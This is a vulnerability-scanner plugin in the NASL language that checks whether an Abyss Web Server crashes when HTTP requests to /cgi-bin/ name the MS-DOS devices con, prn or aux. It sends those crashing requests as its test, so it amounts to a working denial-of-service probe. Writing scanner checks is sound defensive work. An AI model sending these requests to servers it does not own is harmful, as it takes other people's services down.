#
#  This script was written by David Maciejak <david dot maciejak at kyxar dot fr>
#  based on work from Tenable Network Security
#
#  Ref: R00tCr4ck <root@cyberspy.org>
#
#  This script is released under the GNU GPL v2
# 

# Changes by Tenable:
# - Revised plugin title, changed family (6/12/09)


include("compat.inc");

if(description)
{
 script_id(15563);
 script_version ("$Revision: 1.8 $");
 script_xref(name:"OSVDB", value:"11006");
 script_xref(name:"Secunia", value:"12900");

 script_name(english:"Abyss Web Server MS-DOS Device Name DoS");

 script_summary(english:"Try to pass an MS-DOS device name to crash the remote web server");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server is affected by a remote denial of service
vulnerability." );
 script_set_attribute(attribute:"description", value:
"It was possible to kill the web server by sending an MS-DOS device
name in an HTTP request." );
 script_set_attribute(attribute:"see_also", value:"http://archives.neohapsis.com/archives/vulnwatch/2004-q4/0014.html" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to version 1.2.3.0 or higher." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:C" );
 
script_end_attributes();

 script_category(ACT_DENIAL);
 script_copyright(english:"This script is Copyright (C) 2004-2009 David Maciejak");
 script_family(english:"Web Servers");
 script_dependencies("http_version.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}

########

include("http_func.inc");

port = get_http_port(default:80);
if(! get_port_state(port)) exit(0);
banner = get_http_banner(port:port);
if ( ! banner || "Abyss/" >!< banner ) exit(0);
if(http_is_dead(port:port))exit(0);

function check(pt,dev)
{
  local_var r, req, soc;
  req = string("GET /cgi-bin/",dev," HTTP/1.0\r\n\r\n");
  soc = http_open_socket(pt);
  if(! soc) exit(0);

  send(socket:soc, data: req);
  r = http_recv(socket:soc);
  http_close_socket(soc);

  if(http_is_dead(port: pt)) { security_hole(pt); exit(0);}
}

dev_name=make_list("con","prn","aux");
foreach devname (dev_name)
{
  check(pt:port, dev:devname);
}
